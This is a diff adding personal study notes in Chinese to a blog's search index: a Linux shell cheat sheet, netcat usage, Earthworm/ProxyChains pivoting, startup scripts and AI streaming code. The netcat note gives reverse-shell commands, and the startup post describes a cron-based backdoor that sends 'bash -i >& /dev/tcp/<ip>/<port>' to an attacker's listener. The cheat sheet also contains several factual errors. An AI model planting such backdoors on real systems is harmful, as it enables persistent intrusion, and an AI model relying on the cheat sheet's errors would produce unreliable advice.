@@ -2,6 +2,1045 @@
 <search> 
   
   
+    
+    <entry>
+      <title>日志（10）</title>
+      <link href="/2024/12/22/%E6%97%A5%E5%BF%97%EF%BC%8810%EF%BC%89/"/>
+      <url>/2024/12/22/%E6%97%A5%E5%BF%97%EF%BC%8810%EF%BC%89/</url>
+      
+        <content type="html"><![CDATA[<blockquote><p>更改</p></blockquote><p>调整了手机端布局，增加了首页刷新按钮，如遇标签回不到All可尝试点击此按钮返回到最初页面。</p><p>增加了<a href="/hiddenPublic/">双主题</a></p><p>也可以到about页面下划到‘切换主题’，点击切换。</p><p>此主题为了方便看清目录的字，更多细节<del>懒得</del>没有改动，刷新就会回到原主题。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 日志 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 博客 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>linux系统shell脚本书写</title>
+      <link href="/2024/12/22/linux%E8%84%9A%E6%9C%AC%E4%B9%A6%E5%86%99/"/>
+      <url>/2024/12/22/linux%E8%84%9A%E6%9C%AC%E4%B9%A6%E5%86%99/</url>
+      
+        <content type="html"><![CDATA[<p>以bash为例，记录linux系统shell脚本的基本语法和常用命令。</p><p>没必要都背下来，实际用到不记得了一般也是在网上搜，但需要大概知道都能做什么，所以记下来。</p><h2 id="常用命令："><a href="#常用命令：" class="headerlink" title="常用命令："></a>常用命令：</h2><ul><li><p>ls：列出目录下的文件和目录</p><ul><li>ls -l：显示详细信息，包括文件权限、所有者、大小、修改时间等</li><li>ls -a：显示隐藏文件</li><li>ls -d：显示目录本身，而不是目录里的文件</li><li>ls -R：递归显示目录下所有文件和目录</li><li>ls -lh：以更易读的形式显示文件大小</li><li>ls -t：按修改时间排序</li><li>ls -S：按文件大小排序</li><li>ls -X：按文件类型排序</li></ul></li><li><p>pwd：显示当前目录的路径</p></li><li><p>cd：切换目录</p><ul><li>cd ..：返回上级目录</li><li>cd -：返回上次所在目录</li><li>cd ~：返回用户主目录</li><li>cd &#x2F;：切换到根目录</li></ul></li><li><p>mkdir：创建目录</p><ul><li>mkdir -p：创建多级目录</li><li>rmdir：删除空目录</li></ul></li><li><p>touch：创建文件</p></li><li><p>rm：删除文件或目录</p><ul><li>rm -f：强制删除文件或目录</li><li>rm -r：递归删除目录</li><li>rm -i：删除前询问用户</li><li>rm -I：删除前不询问用户</li></ul></li><li><p>mv：移动或重命名文件或目录</p><ul><li>mv -i：移动或重命名前询问用户</li><li>mv -I：移动或重命名前不询问用户</li></ul></li><li><p>cp：复制文件或目录</p><ul><li>cp -r：递归复制目录</li></ul></li><li><p>find：搜索文件或目录</p><ul><li>find . -name “*.txt”：搜索当前目录下所有.txt文件</li><li>find &#x2F; -name “passwd”：搜索系统所有&#x2F;目录下名为passwd的文件</li><li>find &#x2F; -user root：搜索系统所有&#x2F;目录下所有root用户的文件</li><li>find &#x2F; -perm -u&#x3D;x：搜索系统所有&#x2F;目录下所有可执行文件</li><li>find &#x2F; -size +10M：搜索系统所有&#x2F;目录下大小大于10M的文件</li><li>find &#x2F; -type f -size +10M：搜索系统所有&#x2F;目录下类型为文件且大小大于10M的文件</li><li>find &#x2F; -type d -empty：搜索系统所有&#x2F;目录下类型为目录且为空的文件夹</li></ul></li><li><p>chmod：修改文件或目录权限</p><ul><li>chmod 777 file：给file文件添加所有权限(7&#x3D;rwx,777&#x3D;{u(ser)&#x3D;7,g(roup)&#x3D;7,o(ther)&#x3D;7 })</li></ul></li><li><p>chown：修改文件或目录所有者</p><ul><li>chown user file：将file文件的所有者修改为user</li><li>chown user:group file：将file文件的所有者和组修改为user:group</li></ul></li><li><p>chgrp：修改文件或目录组</p><ul><li>chgrp group file：将file文件修改为group组</li></ul></li><li><p>ln：创建链接</p><ul><li>ln （无参数）file link：创建硬链接</li><li>ln -s (..)：创建软链接</li><li>ln -f (..)：强制创建链接</li></ul></li><li><p>ps：查看进程信息</p><ul><li>ps -ef：显示所有进程信息</li><li>ps -ef | grep “keyword”：搜索进程信息</li><li>ps -p pid：显示指定进程信息</li><li>ps -u user：显示指定用户的进程信息</li><li>ps -eo pid,user,cmd | grep “keyword”：搜索进程信息</li></ul></li><li><p>cat：查看文件内容</p><ul><li>cat -n：显示行号</li><li>cat -b：显示不可打印字符</li><li>cat -T：显示特殊字符</li><li>cat file1 file2：显示多个文件内容<br>more和less：</li><li>展示文件内容，more命令一次只能看到一屏的内容，less命令可以翻页查看文件内容。</li><li>less：类似more命令，但是可以向前向后翻页，空格翻页，回车翻页，q退出。</li><li>more：类似less命令，但是只能向下翻页。</li></ul></li><li><p>head：显示文件开头内容</p><ul><li>head -n：显示前n行内容</li><li>head -c：显示前c字节内容</li></ul></li><li><p>tail：显示文件末尾内容</p><ul><li>tail -n：显示后n行内容</li><li>tail -f：实时显示文件末尾内容</li></ul></li><li><p>echo：输出内容到屏幕或文件</p><ul><li>echo -e：支持转义字符</li><li>echo -n：不输出换行符</li></ul></li><li><p>grep：搜索文件内容</p><ul><li>grep -i：忽略大小写</li><li>grep -v：反向选择</li><li>grep -n：显示行号</li><li>grep -c：显示匹配行数</li><li>grep -A：显示匹配行及后n行</li><li>grep -B：显示匹配行及前n行</li><li>grep -C：显示匹配行及上下n行</li><li>grep -o：显示匹配内容</li></ul></li><li><p>awk：数据分析语言</p><ul><li>awk ‘{print $1}’：打印第一列内容</li><li>awk ‘{print $1,$2}’：打印第一、二列内容</li><li>awk ‘{sum+&#x3D;$1} END {print sum}’：求和</li><li>awk ‘{print $1,$2}’ file1 file2：打印多个文件内容</li><li>awk -F：指定分隔符</li><li>awk -v：指定变量</li><li>awk -f：执行外部脚本</li><li>awk -v OFS&#x3D;”:” ‘{print $1,$2}’：指定输出分隔符</li></ul></li><li><p>sort：排序文件内容</p><ul><li>sort -n：按数字排序</li><li>sort -r：反向排序</li><li>sort -k：按指定列排序</li><li>sort -t：指定分隔符</li><li>sort -u：去除重复行</li><li>sort -m：合并已排序文件</li><li>sort -o：输出到文件</li></ul></li><li><p>cut：提取文件内容</p><ul><li>cut -d：指定分隔符</li><li>cut -f：指定列</li><li>cut -c：指定字节</li></ul></li><li><p>uniq：去除重复行</p></li><li><p>wc：统计文件行数、字数、字节数</p><ul><li>wc -l：显示行数</li><li>wc -w：显示字数</li><li>wc -c：显示字节数</li></ul></li><li><p>date：显示当前日期和时间</p><ul><li>date “+%Y-%m-%d %H:%M:%S”：显示格式化日期和时间</li></ul></li><li><p>cal：显示日历</p><ul><li>cal 2024：显示2024年日历</li><li>cal -3：显示上个月、本月、下个月日历</li><li>cal -s：显示星期几缩写</li><li>cal -m：显示月份缩写</li><li>cal -y：显示年份缩写</li></ul></li><li><p>whoami：显示当前用户 </p></li><li><p>who：显示当前登录用户信息</p><ul><li>who -b：显示当前登录用户的位置</li><li>who -m：显示当前登录用户的电话号码</li><li>who -u：显示当前登录用户的用户ID</li></ul></li><li><p>groups：显示当前用户组信息</p><ul><li>groups user：显示指定用户的用户组信息</li></ul></li><li><p>id：显示当前用户信息</p><ul><li>id user：显示指定用户信息</li></ul></li><li><p>last：显示登录记录</p><ul><li>last -u：显示指定用户的登录记录</li></ul></li><li><p>uptime：显示系统运行时间</p></li><li><p>hostname：显示主机名</p></li><li><p>uname：显示系统信息</p><ul><li>uname -a：显示全部信息</li><li>uname -s：显示操作系统名</li><li>uname -n：显示主机名</li><li>uname -r：显示内核版本</li><li>uname -m：显示硬件平台</li></ul></li><li><p>man：显示命令帮助信息</p><ul><li>man command：显示command命令的帮助信息</li><li>man -k keyword：搜索keyword关键字的帮助信息</li></ul></li><li><p>apropos：搜索帮助信息</p><ul><li>apropos keyword：搜索keyword关键字的帮助信息</li></ul></li><li><p>alias：设置命令别名</p><ul><li>alias name&#x3D;’command’：设置name别名为command命令</li><li>unalias name：删除name别名</li></ul></li><li><p>history：显示历史命令</p><ul><li>history：显示所有历史命令</li><li>history -c：清空历史命令</li><li>!n：执行第n条历史命令</li><li>!!：执行上一条命令</li><li>!string：执行最近的以string开头的命令</li></ul></li></ul><h2 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h2><ul><li><p>top：查看系统资源占用情况</p></li><li><p>df：查看磁盘使用情况</p></li><li><p>du：查看目录或文件大小</p></li><li><p>free：查看系统内存使用情况</p></li><li><p>ifconfig：查看网络接口信息</p></li><li><p>netstat：查看网络连接信息</p></li><li><p>ssh：远程登录</p></li><li><p>scp：远程复制文件</p></li><li><p>ssh-keygen：生成ssh密钥</p></li><li><p>ssh-copy-id：将ssh密钥拷贝到远程主机</p></li><li><p>ssh-agent：管理ssh密钥</p></li><li><p>ssh-add：添加ssh密钥到ssh-agent</p></li><li><p>ssh-keyscan：扫描远程主机的ssh密钥</p></li><li><p>sshpass：通过ssh远程执行命令</p></li><li><p>wget：下载文件</p></li><li><p>curl：下载文件</p></li><li><p>tar：打包和压缩文件</p></li><li><p>gzip：压缩文件</p></li><li><p>bzip2：压缩文件</p></li><li><p>unzip：解压文件</p></li><li><p>zip：压缩文件</p></li><li><p>unrar：解压rar文件</p></li><li><p>rsync：同步文件</p></li><li><p>mount：挂载磁盘</p></li><li><p>umount：卸载磁盘</p></li><li><p>fdisk：管理磁盘分区</p></li><li><p>lsof：查看系统打开的文件</p></li><li><p>kill：杀死进程</p></li><li><p>killall：杀死进程</p></li><li><p>ln：创建链接</p></li></ul><h2 id="bash脚本语法："><a href="#bash脚本语法：" class="headerlink" title="bash脚本语法："></a>bash脚本语法：</h2><ul><li>注释：#开头的行表示注释<ul><li>多行注释：&#x2F;* *&#x2F;</li></ul></li><li>变量：以$开头，如$var表示变量var的值<ul><li>字符串变量：用双引号括起来的内容，如”$str”</li><li>数字变量：用$((…))括起来的内容，如”$((num1+num2))”</li><li>数组变量：用${array_name[index]}表示数组元素，如”${array_name[0]}”</li><li>环境变量：用$ENV{var}表示环境变量var的值</li></ul></li><li>字符串：用双引号或单引号括起来的内容，如”hello world”或’hello world’<ul><li>转义字符：\n、\t、\r、\b、\a、\e、\0、\、$、&quot;、&#39;</li><li>变量替换：$var或${var}，如”$name”或”${name}”</li></ul></li><li>运算符：支持算术运算、关系运算、逻辑运算、字符串运算<ul><li>算术运算符：+、-、<em>、&#x2F;、%、</em>*</li><li>关系运算符：-eq、-ne、-gt、-lt、-ge、-le</li><li>逻辑运算符：!、&amp;&amp;、||</li></ul></li><li>条件语句：if、then、else、fi<ul><li>多分支条件：if [ $num -eq 1 ] || [ $num -eq 2 ]; then…; fi</li><li>双分支条件：if [ $num -eq 1 ]; then…; else…; fi</li></ul></li><li>循环语句：for、while、do、done<ul><li>for循环：for var in item1 item2…; do…; done</li><li>while循环：while [ condition ]; do…; done</li><li>until循环：until [ condition ]; do…; done</li></ul></li><li>控制结构：case、esac、select、function<ul><li>case语句：case $var in pattern1) command1;; pattern2) command2;;…; esac</li><li>select语句：select var in item1 item2…; do…; done</li></ul></li><li>函数：function name(){…}<ul><li>调用函数：name arg1 arg2…</li><li>脚本：#!&#x2F;bin&#x2F;bash</li><li>脚本参数：$#、$0、$1、$2、…、$@、$*</li><li>脚本执行：.&#x2F;script.sh arg1 arg2…</li></ul></li><li>数组：array_name[index]&#x3D;value</li><li>后台运行：&amp;<ul><li>nohup command &amp;：即使退出系统，command仍然在后台运行</li></ul></li><li>管道：|<br>  管道符|表示将前一个命令的输出作为后一个命令的输入。如ls -l &#x2F;etc | grep “^-“表示列出&#x2F;etc目录下以”-“开头的文件信息。</li><li>重定向：&gt;、&gt;&gt;、&lt;、&lt;&lt;<ul><li>&gt;：输出重定向，将命令的输出重定向到文件，覆盖原文件内容</li><li>&gt;&gt;：追加重定向，将命令的输出重定向到文件，追加到原文件内容</li><li>&lt;：输入重定向，将文件内容作为命令的输入</li><li>&lt;&lt;：here文档，将后面的内容作为命令的输入，可以跨行</li><li>将标准输出重定向：    <ul><li>command &gt; file：将命令的输出重定向到文件</li><li>command &gt;&gt; file：将命令的输出追加到文件</li><li>command &lt; file：将文件内容作为命令的输入</li><li>command &lt;&lt; delimiter：here文档，将后面的内容作为命令的输入，可以跨行</li></ul></li><li>将标准错误重定向：<ul><li>command 2&gt; file：将命令的错误输出重定向到文件</li><li>command 2&gt;&gt; file：将命令的错误输出追加到文件</li></ul></li><li>合并重定向：<ul><li>command1 &gt; file 2&gt;&amp;1：将命令的输出和错误输出合并到文件</li></ul></li><li>筛去错误输出：<ul><li>command 2&gt;&#x2F;dev&#x2F;null：筛去命令的错误输出</li></ul></li></ul></li><li>环境变量：$PATH、$HOME、$PWD、$USER、$SHELL、$UID、$PS1、$PS2、$PS3、$PS4<ul><li>$PATH：搜索命令的路径</li><li>$HOME：用户主目录</li><li>$PWD：当前工作目录</li><li>$USER：当前用户</li><li>$SHELL：当前登录的shell</li><li>$UID：当前用户ID</li><li>$PS1：命令提示符，默认是”$”</li><li>$PS2：第二个命令提示符，默认是”&gt;”</li><li>$PS3：第三个命令提示符，默认是”#”</li><li>$PS4：第四个命令提示符，用于调试脚本</li></ul></li><li>退出状态：0表示成功，非0表示失败<ul><li>$?：上个命令的退出状态</li><li>$!：上个后台命令的进程号</li><li>自定义退出状态：exit n，n为0-255之间的整数</li><li>判断退出状态：if [ $? -eq 0 ]; then…; else…; fi</li><li>取消自定义退出状态：trap “” EXIT</li></ul></li><li>调试：set -x、set -e、bash -x<ul><li>set -x：显示执行的命令</li><li>set -e：遇到错误立即退出脚本</li><li>bash -x：显示执行的脚本内容</li></ul></li><li>脚本参数：$#、$0、$1、$2、…、$@、$*<ul><li>$#：传递给脚本的参数个数</li><li>$0：脚本名</li><li>$1、$2、…：传递给脚本的第一个参数、第二个参数、…</li><li>$@：传递给脚本的所有参数，以”$1” “$2”…的形式展开</li><li>$*：传递给脚本的所有参数，以”$1” “$2”…的形式展开，但是不包括脚本名</li></ul></li><li>定时任务：crontab命令<ul><li>crontab -e：编辑定时任务</li><li>crontab -l：列出定时任务</li><li>crontab -r：删除定时任务</li></ul></li><li>日志：logger命令<ul><li>logger “message”：记录日志信息</li><li>logger -p priority “message”：设置日志级别，priority为emerg、alert、crit、err、warning、notice、info、debug</li></ul></li><li>进程管理：nohup、&amp;、jobs、kill、bg、fg、disown、wait、trap、killall、killpg、wait<ul><li>nohup command：不挂断地运行命令</li><li>&amp;：将命令放入后台运行</li><li>jobs：显示当前后台任务</li><li>kill pid：杀死进程<ul><li>kill -9 pid：强制杀死进程</li><li>kill -l：列出所有信号名称</li></ul></li><li>bg pid：将进程放入后台<ul><li>bg %：将当前任务放入后台</li></ul></li><li>fg pid：将后台进程放入前台<ul><li>fg %：将当前任务放入前台</li></ul></li><li>disown：将当前工作目录切换到后台<ul><li>disown %：将当前任务的工作目录切换到后台</li></ul></li></ul><pre><code class="shell"># 一个将任务放到后台，记下进程号，等任务完成后再拿到前台的脚本例子#!/bin/bash# 将任务放到后台some_command &amp;  # 将your_command替换为实际的命令PID=$!          # 记录进程号echo &quot;任务已放入后台，进程号: $PID&quot;# 等待后台任务完成wait $PIDecho &quot;任务已完成，进程号: $PID&quot;# 将任务带回前台（如果需要）fg %1  # 假设%1是对应的作业号</code></pre><ul><li>wait：等待子进程结束<ul><li>wait -n：等待n秒</li><li>wait -p：显示进程号</li><li>用法举例：<pre><code class="shell">#!/bin/bash# 后台运行sleep- sleep 10 &amp;# 等待后台sleep结束- wait# sleep结束后输出done- echo &quot;done&quot;</code></pre></li></ul></li><li>trap command signal：设置信号处理命令</li><li>killall command：杀死所有command进程</li><li>killpg pid：杀死进程组</li><li>你不是杀手，你不要一直杀杀杀。</li></ul></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 计算机 </category>
+          
+          <category> 操作系统 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 笔记 </tag>
+            
+            <tag> linux </tag>
+            
+            <tag> shell </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>记nc工具几种用法</title>
+      <link href="/2024/12/22/%E8%AE%B0nc%E5%B7%A5%E5%85%B7%E5%87%A0%E7%A7%8D%E7%94%A8%E6%B3%95/"/>
+      <url>/2024/12/22/%E8%AE%B0nc%E5%B7%A5%E5%85%B7%E5%87%A0%E7%A7%8D%E7%94%A8%E6%B3%95/</url>
+      
+        <content type="html"><![CDATA[<p>原文链接：<a href="https://blog.csdn.net/aasdad1/article/details/106257765">https://blog.csdn.net/aasdad1/article/details/106257765</a></p><p>nc，netcat或者ncat，主要与网络连接相关</p><p>摘录几个常用用法：</p><blockquote><p>消息传输</p></blockquote><p>主机1：nc -lvp port<br>主机2：nc ip port</p><blockquote><p>文件传输</p></blockquote><p>主机1：nc -lvp port &lt; file<br>主机2：nc ip port &gt; file</p><blockquote><p>端口扫描</p></blockquote><p>nc -z ip port</p><blockquote><p>端口转发</p></blockquote><p>nc -lvp port1 -w 1 ip2 port2<br>这是将主机1的port1端口的数据转发到主机2的ip2的port2端口</p><blockquote><p>nc反弹shell</p></blockquote><p>nc -lvp port1 -e &#x2F;bin&#x2F;bash<br>这是为任何连接此端口的人开放一个反弹shell</p><blockquote><p>端口转发+反弹shell</p></blockquote><p>nc -lvp port1 -w 1 ip2 port2 -e &#x2F;bin&#x2F;bash<br>这是主动连接到ip2的port2端口，连接成功后将所有数据转发到ip1的port1端口，并在此端口上开启一个反弹shell</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 计算机 </category>
+          
+          <category> 渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透 </tag>
+            
+            <tag> 笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Earthworm+ProxyChains实现内网代理</title>
+      <link href="/2024/12/20/Earthworm-ProxyChains%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/"/>
+      <url>/2024/12/20/Earthworm-ProxyChains%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/</url>
+      
+        <content type="html"><![CDATA[<p>仅仅只是笔记，更多参考官方文档</p><blockquote><p>前提：所有主机均可控</p></blockquote><p>为什么有这么个前提，因为Earthworm（以下简称ew）是用来做内网渗透的，这里记的内网代理就是流程的一部分。</p><blockquote><p>更小的前提：所有主机可以互相ping通（在同一网段内或者有公网主机）</p></blockquote><p>这是因为只记ew的第一种用法，也许之后用到其他的会回来补。</p><p>目标代理主机上执行</p><pre><code class="shell">git clone https://github.com/idlefire/ew</code></pre><p>将ew下载到本地</p><pre><code class="shell">cd ewew_for_Win.exe # 换成你自己的系统类型,可以查看一下目录都有哪些ew ./ew -s ssocksd -l &lt;port&gt; # 开放端口socks5代理</code></pre><p>攻击主机（或者说需要代理的主机）上执行</p><pre><code class="shell">vim   /etc/proxychains.conf  # proxychains的配置文件，在此之前先要安装proxychains服务</code></pre><p>打开后文末修改添加<br><code>socks5 &lt;目标主机内网ip&gt; &lt;port&gt;</code><br>注意端口一致</p><p>proxychains 使用方法是在每条命令前加上proxychains</p><p>到此内网代理已经完成，攻击主机所有流量会经过目标代理主机，可以访问原来受限的目标。同在一个局域网可能作用不大，但可以不需要下载梯子就共享vpn流量，前提是目标主机开启clash的全局代理。</p><p>直接将代理端口设为vpn代理端口也是不行的，只能开全局代理。</p><p>如果我这时候虚拟机没下梯子，那还挺方便的，可惜。</p><p>如果是浏览器的话，就在浏览器上手动设置代理，效果应该一样。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 计算机 </category>
+          
+          <category> 渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 代理 </tag>
+            
+            <tag> 渗透 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>创建系统开机自启动程序</title>
+      <link href="/2024/12/19/%E5%88%9B%E5%BB%BA%E7%B3%BB%E7%BB%9F%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8%E7%A8%8B%E5%BA%8F/"/>
+      <url>/2024/12/19/%E5%88%9B%E5%BB%BA%E7%B3%BB%E7%BB%9F%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8%E7%A8%8B%E5%BA%8F/</url>
+      
+        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>某些程序或者服务每次开机都要一遍遍打开终端输入命令很麻烦</p><p>说的就是你，hexo</p><h2 id="构建shell命令脚本"><a href="#构建shell命令脚本" class="headerlink" title="构建shell命令脚本"></a>构建shell命令脚本</h2><p>创建后缀名为<code>.sh</code>的脚本，设置相适应的默认启动程序</p><p>编辑脚本内容，输入shell命令</p><p>拿hexo举例(它应得的)</p><pre><code class="shell"># 转到目录下（举例）（如果把脚本放在了此目录下就不用cd了）cd \\hexo-blog\\ # 一定记得是双斜杠# 执行命令hexo s## 其他命令</code></pre><p>*你可以把所有需要启用的命令一口气放进去，只要路径正确；或者在不同路径下创建不同的sh，这样就不需要cd了</p><p>补一个一键上传</p><pre><code class="shell">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code></pre><p>如果是github</p><pre><code class="shell">git add . &amp;&amp; git commit -m &quot;update&quot; &amp;&amp; git push &lt;origin&gt; &lt;master&gt;</code></pre><p>然后需要用的时候双击运行，看着命令行跑就好了，超爽的有木有</p><h2 id="开机自启动"><a href="#开机自启动" class="headerlink" title="开机自启动"></a>开机自启动</h2><p>win+R打开运行，输入<code>shell:startup</code>打开启动文件夹</p><p>将脚本的快捷方式放入其中，每次开机就能自动运行了</p><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><h3 id="在windows系统中运行bash（如果是linux系统就可以忽略了）"><a href="#在windows系统中运行bash（如果是linux系统就可以忽略了）" class="headerlink" title="在windows系统中运行bash（如果是linux系统就可以忽略了）"></a>在windows系统中运行bash（如果是linux系统就可以忽略了）</h3><p>安装<code>git bash</code></p><p>或者安装Cygwin64作为中间层来模拟linux环境</p><p>或者启用windows自带的适用于linux的子程序</p><p>我都试了一下，建议git bash，因为更现代化，并且能直接在终端上切换</p><h3 id="自定义命令"><a href="#自定义命令" class="headerlink" title="自定义命令"></a>自定义命令</h3><p>找到.bashrc，修改文件</p><p>文件中添加自定义命令：</p><pre><code class="shell"># alias &lt;你的命令&gt;=&#39;&lt;原本的命令&gt;&#39;# 如alias hs=&#39;hexo s&#39;</code></pre><p>更具体的更改：<a href="https://blog.csdn.net/craftsman2020/article/details/111945949">https://blog.csdn.net/craftsman2020/article/details/111945949</a></p><h3 id="windows自定义命令"><a href="#windows自定义命令" class="headerlink" title="windows自定义命令"></a>windows自定义命令</h3><p>没有找到更好的，一般就是在用户目录下创建一个脚本，或者修改环境变量</p><h3 id="构建定时发送反弹shell的后门"><a href="#构建定时发送反弹shell的后门" class="headerlink" title="构建定时发送反弹shell的后门"></a>构建定时发送反弹shell的后门</h3><p>当你渗透达成目标一般不就这么一拍屁股走人，因为也许下次你还想来，这就要创建后门</p><p>当然，创建后门是需要承担风险的</p><p><a href="https://www.runoob.com/linux/linux-comm-crontab.html">crontab命令</a>用来定时启动程序，这里就是定时发送反弹shell</p><p>crontab file 这里的file就是创建的后门文件了</p><p>文件内容举例：</p><pre><code>bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</code></pre><p>更多反弹shell：<a href="https://blog.csdn.net/weixin_44288604/article/details/111740527">https://blog.csdn.net/weixin_44288604/article/details/111740527</a></p><p>下次开机时，使用nc监听端口</p><pre><code>nc -lvp &lt;port&gt;</code></pre><p>受害者主机如果后门还存在，bash就会自动送上门了</p><p>windows可以下了nmap，然后用nmap自带的ncat代替</p><p>关于nc也许也另起一篇，也许挂个链接，毕竟前人之述备矣。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 计算机 </category>
+          
+          <category> 操作系统 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 日志 </tag>
+            
+            <tag> 操作系统 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Ai的流式返回及结果处理</title>
+      <link href="/2024/12/19/Ai%E7%9A%84%E6%B5%81%E5%BC%8F%E8%BF%94%E5%9B%9E%E5%8F%8A%E5%A4%84%E7%90%86/"/>
+      <url>/2024/12/19/Ai%E7%9A%84%E6%B5%81%E5%BC%8F%E8%BF%94%E5%9B%9E%E5%8F%8A%E5%A4%84%E7%90%86/</url>
+      
+        <content type="html"><![CDATA[<p>参考文章：<a href="https://blog.csdn.net/qq_41298763/article/details/144560606">https://blog.csdn.net/qq_41298763/article/details/144560606</a></p><p>简单来说，就是我们持续接收，api持续响应，每次返回一部分数据（如一两个字），然后前端逐步展示，直到全部返回。</p><p>这样会比单次返回更加流畅，用户体验更好。</p><p>折腾了好久，最后感觉也没什么好说的，直接粘代码吧，都在代码里了。</p><pre><code class="javascript"> fetch(`$&#123;apiUrl&#125;/api/chat`, &#123;            method: &#39;POST&#39;,            headers: &#123; &#39;Content-Type&#39;: &#39;application/json&#39; &#125;,            body: JSON.stringify(requestData)        &#125;)//post请求，requestData包含请求参数,比如message、stream        .then(response =&gt; &#123;            const reader = response.body.getReader();            const textDecoder = new TextDecoder(&quot;utf-8&quot;);            //读取字节流，解码为utf-8字符串            //这两个工具不放入readStream是避免每次重新创建，可被重用            let fullResponse = &#39;&#39;;  // 用于存储完整的 AI 回复内容            function readStream() &#123;//这里只是把方法定义了，之后才是执行                reader.read().then((&#123; done, value &#125;) =&gt; &#123;                    if (done) &#123;                        /*                        Ai回复完成的逻辑                        具体可以有启用输入栏，Ai下次回复换行之类                        */                        return;                    &#125;                                        const chunk = textDecoder.decode(value, &#123; stream: true &#125;);                    const data = JSON.parse(chunk);                    //接收字节流，解码为json数据                                        if (data.message) &#123;                        fullResponse += data.message.content; // 将内容逐字累加到 fullResponse                        // 更新最后一条 AI 回复为最新内容                        replaceLastAIMessage(`AI: $&#123;fullResponse&#125;`);                        //这个逻辑我就不粘了，就是一个文本替换                    &#125;                    readStream();//递归调用，继续读取字节流                &#125;);            &#125;            readStream();//启动递归调用，开始读取字节流        &#125;)</code></pre><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><h3 id="ai回复过慢"><a href="#ai回复过慢" class="headerlink" title="ai回复过慢"></a>ai回复过慢</h3><p>如果给了Ai过多系统消息，会加载的很慢，一场对话的开始需要将近1分钟，并且如果用户隔一段时间不回复，又会重新加载系统消息。</p><p>这个加载过程应该是在服务端也就是我自己的电脑上完成的，因为在不同gui调用同一个api不需要重新加载</p><h3 id="ai历史记录的处理"><a href="#ai历史记录的处理" class="headerlink" title="ai历史记录的处理"></a>ai历史记录的处理</h3><p>这个历史记录应该既包含用户的消息，也包含ai的回复。</p><p>这个json上传的数据是一个数组，包含user和ai等的回复，我自己创建一个数组，然后每次把user和ai的回复推进数组，但发现一旦ai回复在数组里，ai就不回答了。</p><p>而使用‘ai：’这种方式明显效果不如隔壁，本地ai错以为每次对话都是新的开始。<br>也许的确是这样，但我们得让它把这种效果模拟出来。</p><p>没能有一个差强人意的效果，所以我先去了这一部分。</p><h3 id="跨域请求"><a href="#跨域请求" class="headerlink" title="跨域请求"></a>跨域请求</h3><p>即使是同一个域名下的请求，也会遇到跨域问题，解决方法是：</p><ul><li>后端设置响应头，允许跨域请求</li></ul><pre><code class="Node.js">res.setHeader(&#39;Access-Control-Allow-Origin&#39;, &#39;*&#39;); // 允许所有来源访问</code></pre><p>看着玩玩就好了，没试过，最好的办法还是得发送请求时避免跨域问题，比如说把文件挂载到本地服务器</p><p>更多：<a href="https://blog.csdn.net/jined/article/details/120693745">https://blog.csdn.net/jined/article/details/120693745</a></p><h3 id="返回异常或错误"><a href="#返回异常或错误" class="headerlink" title="返回异常或错误"></a>返回异常或错误</h3><p>在浏览器控制台网络，刷新，打开标红的异常文件查看响应，有时候会详细标注错误，比如语法错误，格式错误</p><p>最后是一个流式返回的效果<br><video width="600" controls autoplay loop muted><br>    <source src="/video/Ai流式返回效果.mp4" type="video/mp4"><br>    您的浏览器不支持 视频播放。<br></video></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 计算机 </category>
+          
+          <category> 后端 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> AI </tag>
+            
+            <tag> 后端 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>如何从零开始创建自定义ai及api接口（梦想版）</title>
+      <link href="/2024/12/19/%E5%A6%82%E4%BD%95%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%9B%E5%BB%BA%E8%87%AA%E5%AE%9A%E4%B9%89ai%E5%8F%8Aapi%E6%8E%A5%E5%8F%A3/"/>
+      <url>/2024/12/19/%E5%A6%82%E4%BD%95%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%9B%E5%BB%BA%E8%87%AA%E5%AE%9A%E4%B9%89ai%E5%8F%8Aapi%E6%8E%A5%E5%8F%A3/</url>
+      
